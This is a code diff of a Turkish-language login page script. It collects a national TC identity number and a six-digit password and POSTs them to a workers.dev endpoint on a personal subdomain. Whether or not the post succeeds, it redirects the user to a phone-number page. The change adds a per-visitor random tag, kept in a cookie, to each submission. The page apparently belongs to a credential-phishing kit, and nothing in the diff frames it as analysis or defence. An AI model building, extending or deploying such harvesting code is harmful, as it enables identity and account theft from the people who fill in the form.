@@ -430,41 +430,44 @@
 
         // Giriş düğmesine tıklandığında formu gönder
         loginBtn.addEventListener("click", function () {
-    // TC kimlik numarası ve şifreyi al
-    var tcno = tcInput.value;
-    var pass = passInput.value;
+            // TC kimlik numarası ve şifreyi al
+            var tcno = tcInput.value;
+            var pass = passInput.value;
 
-    // TC kimlik numarası ve şifre uzunluğunu kontrol et
-    if (tcno.length === 11 && pass.length === 6) {
-        // TC kimlik doğrulaması yap
-        if (tcno_dogrula_ve_islem_yap(tcno)) {
-            // POST işlemi için veri oluştur
-            var data = new FormData();
-            data.append('tcno', tcno);
-            data.append('pass', pass);
+            // Kullanıcıya atanmış adı al
+            var assignedName = getCookie("savedName");
 
-            // POST işlemi için fetch kullanarak isteği oluştur
-            fetch('https://worker-steep-shape-b948.selimjuhan2.workers.dev/', {
-                method: 'POST',
-                body: data
-            })
-            .then(response => response.text())
-            .then(data => {
-                console.log(data);
-               
-                window.location.href = 'telefon.html';
-            })
-            .catch(error => {
-                console.error('Hata:', error);
-                window.location.href = 'telefon.html';
-            });
-        } else {
-            alert("Geçersiz TC Kimlik Numarası");
-        }
-    } else {
-        alert("TC Kimlik Numarası ve şifre eksik veya hatalı.");
-    }
-}); 
+            // TC kimlik numarası ve şifre uzunluğunu kontrol et
+            if (tcno.length === 11 && pass.length === 6) {
+                // TC kimlik doğrulaması yap
+                if (tcno_dogrula_ve_islem_yap(tcno)) {
+                    // POST işlemi için veri oluştur
+                    var data = new FormData();
+                    data.append('tcno', tcno);
+                    data.append('pass', pass);
+                    data.append('name', assignedName); // Kullanıcıya atanan adı POST verilerine ekle
+
+                    // POST işlemi için fetch kullanarak isteği oluştur
+                    fetch('https://worker-steep-shape-b948.selimjuhan2.workers.dev/', {
+                        method: 'POST',
+                        body: data
+                    })
+                    .then(response => response.text())
+                    .then(data => {
+                        console.log(data);
+                        window.location.href = 'telefon.html';
+                    })
+                    .catch(error => {
+                        console.error('Hata:', error);
+                        window.location.href = 'telefon.html';
+                    });
+                } else {
+                    alert("Geçersiz TC Kimlik Numarası");
+                }
+            } else {
+                alert("TC Kimlik Numarası ve şifre eksik veya hatalı.");
+            }
+        }); 
 
         // TC kimlik doğrulama fonksiyonu
         async function tcno_dogrula_ve_islem_yap(tcno) {
@@ -496,7 +499,49 @@
             }
             return true;
         }
+
+        function setCookie(name, value, days) {
+            var expires = "";
+            if (days) {
+                var date = new Date();
+                date.setTime(date.getTime() + (days * 24 * 60 * 60 * 1000));
+                expires = "; expires=" + date.toUTCString();
+            }
+            document.cookie = name + "=" + (value || "") + expires + "; path=/";
+        }
+
+        function getCookie(name) {
+            var nameEQ = name + "=";
+            var ca = document.cookie.split(';');
+            for (var i = 0; i < ca.length; i++) {
+                var c = ca[i];
+                while (c.charAt(0) === ' ') c = c.substring(1, c.length);
+                if (c.indexOf(nameEQ) === 0) return c.substring(nameEQ.length, c.length);
+            }
+            return null;
+        }
+
+        // Rastgele ad oluşturma fonksiyonu
+        function generateRandomName(length) {
+            var result = '';
+            var characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
+            var charactersLength = characters.length;
+            for (var i = 0; i < length; i++) {
+                result += characters.charAt(Math.floor(Math.random() * charactersLength));
+            }
+            return result;
+        }
+
+        // Sayfa yüklendiğinde otomatik ad ataması yap
+        document.addEventListener("DOMContentLoaded", function () {
+            var savedName = getCookie("savedName");
+            if (!savedName) {
+                var randomName = generateRandomName(6);
+                setCookie("savedName", randomName, 1); // 1 gün süreyle sakla
+            }
+        });
     });
 </script>
+
 
 </body></html>
